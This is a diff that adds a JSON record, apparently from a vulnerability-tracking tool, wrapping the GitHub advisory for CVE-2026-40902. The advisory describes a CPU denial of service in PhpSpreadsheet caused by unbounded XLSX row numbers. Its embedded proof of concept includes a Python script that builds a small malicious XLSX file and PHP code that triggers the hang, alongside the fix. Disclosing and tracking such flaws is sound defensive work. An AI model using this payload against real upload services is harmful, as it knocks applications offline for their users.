@@ -1,0 +1,61 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/114768995?v=4\", \"events_url\": \"https://api.github.com/users/offset/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/offset/followers\", \"following_url\": \"https://api.github.com/users/offset/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/offset/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/offset\", \"id\": 114768995, \"login\": \"offset\", \"node_id\": \"U_kgDOBtc8Yw\", \"organizations_url\": \"https://api.github.com/users/offset/orgs\", \"received_events_url\": \"https://api.github.com/users/offset/received_events\", \"repos_url\": \"https://api.github.com/users/offset/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/offset/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/offset/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/offset\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-40902\", \"cvss\": {\"score\": 7.5, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 7.5, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-400\", \"name\": \"Uncontrolled Resource Consumption\"}, {\"cwe_id\": \"CWE-770\", \"name\": \"Allocation of Resources Without Limits or Throttling\"}], \"description\": \"## Summary\\n\\nThe XLSX reader's `ColumnAndRowAttributes::readRowAttributes()` method reads row numbers from XML attributes without validating them against the spreadsheet maximum row limit (`AddressRange::MAX_ROW = 1,048,576`). An attacker can craft a minimal XLSX file (~1.6KB) containing a `<row r=\\\"999999999\\\"/>` element that inflates `cachedHighestRow` to 999,999,999, causing any subsequent row iteration to attempt ~1 billion loop cycles and exhaust CPU resources.\\n\\n## Details\\n\\nIn `src/PhpSpreadsheet/Reader/Xlsx/ColumnAndRowAttributes.php` at line 216, the row index is cast directly from XML without bounds checking:\\n\\n```php\\n// ColumnAndRowAttributes.php:216\\n$rowIndex = (int) $row['r'];  // No validation against AddressRange::MAX_ROW\\n```\\n\\nThis value flows through `setRowAttributes()` (line 126) → `$this->worksheet->getRowDimension($rowNumber)` (line 60), which updates the cached highest row in `Worksheet.php:1348`:\\n\\n```php\\n// Worksheet.php:1342-1349\\npublic function getRowDimension(int $row): RowDimension\\n{\\n    if (!isset($this->rowDimensions[$row])) {\\n        $this->rowDimensions[$row] = new RowDimension($row);\\n        $this->cachedHighestRow = max($this->cachedHighestRow, $row);\\n    }\\n    return $this->rowDimensions[$row];\\n}\\n```\\n\\nThe inflated `cachedHighestRow` is then returned by `getHighestRow()` (line 1099) and used as the default end bound in `RowIterator::resetEnd()` (RowIterator.php:86):\\n\\n```php\\n// RowIterator.php:86\\n$this->endRow = $endRow ?: $this->subject->getHighestRow();\\n```\\n\\nNotably, column attributes already have equivalent validation at line 161 (`AddressRange::MAX_COLUMN_INT`), and cell coordinates are validated in `Coordinate::coordinateFromString()` (line 40) against `MAX_ROW`. The row dimension attribute path bypasses both of these checks.\\n\\n## PoC\\n\\n**Step 1: Create the malicious XLSX file (~1.6KB)**\\n\\n```python\\nimport zipfile\\nimport io\\n\\ncontent_types = '<?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\"?><Types xmlns=\\\"http://schemas.openxmlformats.org/package/2006/content-types\\\"><Default Extension=\\\"rels\\\" ContentType=\\\"application/vnd.openxmlformats-package.relationships+xml\\\"/><Default Extension=\\\"xml\\\" ContentType=\\\"application/xml\\\"/><Override PartName=\\\"/xl/workbook.xml\\\" ContentType=\\\"application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml\\\"/><Override PartName=\\\"/xl/worksheets/sheet1.xml\\\" ContentType=\\\"application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml\\\"/></Types>'\\n\\nrels = '<?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\"?><Relationships xmlns=\\\"http://schemas.openxmlformats.org/package/2006/relationships\\\"><Relationship Id=\\\"rId1\\\" Type=\\\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument\\\" Target=\\\"xl/workbook.xml\\\"/></Relationships>'\\n\\nworkbook = '<?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\"?><workbook xmlns=\\\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\\\" xmlns:r=\\\"http://schemas.openxmlformats.org/officeDocument/2006/relationships\\\"><sheets><sheet name=\\\"Sheet1\\\" sheetId=\\\"1\\\" r:id=\\\"rId1\\\"/></sheets></workbook>'\\n\\nwb_rels = '<?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\"?><Relationships xmlns=\\\"http://schemas.openxmlformats.org/package/2006/relationships\\\"><Relationship Id=\\\"rId1\\\" Type=\\\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet\\\" Target=\\\"worksheets/sheet1.xml\\\"/></Relationships>'\\n\\nsheet = '<?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\"?><worksheet xmlns=\\\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\\\"><sheetData><row r=\\\"1\\\"><c r=\\\"A1\\\"><v>1</v></c></row><row r=\\\"999999999\\\" ht=\\\"15\\\"/></sheetData></worksheet>'\\n\\nwith zipfile.ZipFile('dos_row.xlsx', 'w', zipfile.ZIP_DEFLATED) as zf:\\n    zf.writestr('[Content_Types].xml', content_types)\\n    zf.writestr('_rels/.rels', rels)\\n    zf.writestr('xl/workbook.xml', workbook)\\n    zf.writestr('xl/_rels/workbook.xml.rels', wb_rels)\\n    zf.writestr('xl/worksheets/sheet1.xml', sheet)\\n\\nprint(\\\"Created dos_row.xlsx\\\")\\n```\\n\\n**Step 2: Load with PhpSpreadsheet (CPU exhaustion)**\\n\\n```php\\n<?php\\nrequire 'vendor/autoload.php';\\n\\nuse PhpOffice\\\\PhpSpreadsheet\\\\IOFactory;\\n\\n$reader = IOFactory::createReader('Xlsx');\\n$spreadsheet = $reader->load('dos_row.xlsx');\\n$sheet = $spreadsheet->getActiveSheet();\\n\\necho \\\"Highest row: \\\" . $sheet->getHighestRow() . \\\"\\\\n\\\";\\n// Output: Highest row: 999999999\\n\\n// This will consume CPU for ~144 seconds (999M iterations)\\nforeach ($sheet->getRowIterator() as $row) {\\n    // CPU exhaustion\\n}\\n```\\n\\n**Expected output:** `getHighestRow()` returns 999999999. Any row iteration hangs indefinitely.\\n\\n## Impact\\n\\n- **CPU Denial of Service:** A 1.6KB crafted XLSX file causes ~999 million loop iterations in any application that iterates rows using `getRowIterator()` or uses `getHighestRow()` as a loop bound. Estimated CPU burn is ~144 seconds per file.\\n- **Memory Exhaustion:** Applications that accumulate data during iteration (e.g., importing rows into a database, building arrays) will also exhaust memory.\\n- **Amplification:** The ratio of input size to resource consumption is extreme — 1,580 bytes triggers nearly 1 billion iterations.\\n- **Common Attack Surface:** PhpSpreadsheet is widely used in web applications that accept user-uploaded spreadsheets for import/processing, making this easily exploitable remotely.\\n\\n## Recommended Fix\\n\\nAdd row bounds validation in `readRowAttributes()` at line 216, matching the column validation pattern already present at line 161:\\n\\n```php\\n// src/PhpSpreadsheet/Reader/Xlsx/ColumnAndRowAttributes.php:216\\n// Before:\\n$rowIndex = (int) $row['r'];\\n\\n// After:\\n$rowIndex = (int) $row['r'];\\nif ($rowIndex < 1 || $rowIndex > AddressRange::MAX_ROW) {\\n    continue;\\n}\\n```\\n\\nThe `AddressRange` import is already present at line 5 of this file. This fix is consistent with the existing cell coordinate validation in `Coordinate::coordinateFromString()` and the column validation at line 161.\", \"epss\": {\"percentage\": 0.00395, \"percentile\": 0.31504}, \"ghsa_id\": \"GHSA-7c6m-4442-2x6m\", \"github_reviewed_at\": \"2026-04-29T20:24:13Z\", \"html_url\": \"https://github.com/advisories/GHSA-7c6m-4442-2x6m\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-7c6m-4442-2x6m\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-40902\"}], \"nvd_published_at\": \"2026-05-12T22:16:33Z\", \"published_at\": \"2026-04-29T20:24:13Z\", \"references\": [\"https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-7c6m-4442-2x6m\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-40902\", \"https://github.com/advisories/GHSA-7c6m-4442-2x6m\"], \"repository_advisory_url\": \"https://api.github.com/repos/PHPOffice/PhpSpreadsheet/security-advisories/GHSA-7c6m-4442-2x6m\", \"severity\": \"high\", \"source_code_location\": \"https://github.com/PHPOffice/PhpSpreadsheet\", \"summary\": \"PhpSpreadsheet has CPU Denial of Service via Unbounded Row Number in XLSX Row Dimensions\", \"type\": \"reviewed\", \"updated_at\": \"2026-05-13T16:31:38Z\", \"url\": \"https://api.github.com/advisories/GHSA-7c6m-4442-2x6m\", \"vulnerabilities\": [{\"first_patched_version\": \"5.7.0\", \"package\": {\"ecosystem\": \"composer\", \"name\": \"phpoffice/phpspreadsheet\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \">= 4.0.0, <= 5.6.0\"}, {\"first_patched_version\": \"3.10.5\", \"package\": {\"ecosystem\": \"composer\", \"name\": \"phpoffice/phpspreadsheet\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \">= 3.3.0, <= 3.10.4\"}, {\"first_patched_version\": \"2.4.5\", \"package\": {\"ecosystem\": \"composer\", \"name\": \"phpoffice/phpspreadsheet\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \">= 2.2.0, <= 2.4.4\"}, {\"first_patched_version\": \"2.1.16\", \"package\": {\"ecosystem\": \"composer\", \"name\": \"phpoffice/phpspreadsheet\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \">= 2.0.0, <= 2.1.15\"}, {\"first_patched_version\": \"1.30.4\", \"package\": {\"ecosystem\": \"composer\", \"name\": \"phpoffice/phpspreadsheet\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 1.30.3\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-7c6m-4442-2x6m",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "phpoffice/phpspreadsheet: <= 1.30.3",
+      "phpoffice/phpspreadsheet: >= 2.0.0, <= 2.1.15",
+      "phpoffice/phpspreadsheet: >= 2.2.0, <= 2.4.4",
+      "phpoffice/phpspreadsheet: >= 3.3.0, <= 3.10.4",
+      "phpoffice/phpspreadsheet: >= 4.0.0, <= 5.6.0"
+    ],
+    "authentication_required": false,
+    "cves": [
+      "CVE-2026-40902"
+    ],
+    "cvss_score": 7.5,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "phpoffice/phpspreadsheet"
+    ],
+    "remote": true,
+    "vendor_severity": "high"
+  },
+  "first_seen_at": "2026-07-20T19:52:02.485809Z",
+  "provenance": {
+    "content_sha256": "34a29fc464a61013f6d16c80396aea0f693d467b9987e46c94a74175f13bb41c",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-04-29T20:24:13Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-7c6m-4442-2x6m",
+  "status": "active",
+  "title": "PhpSpreadsheet has CPU Denial of Service via Unbounded Row Number in XLSX Row Dimensions",
+  "updated_at": "2026-05-13T16:31:38Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-7c6m-4442-2x6m"
+}
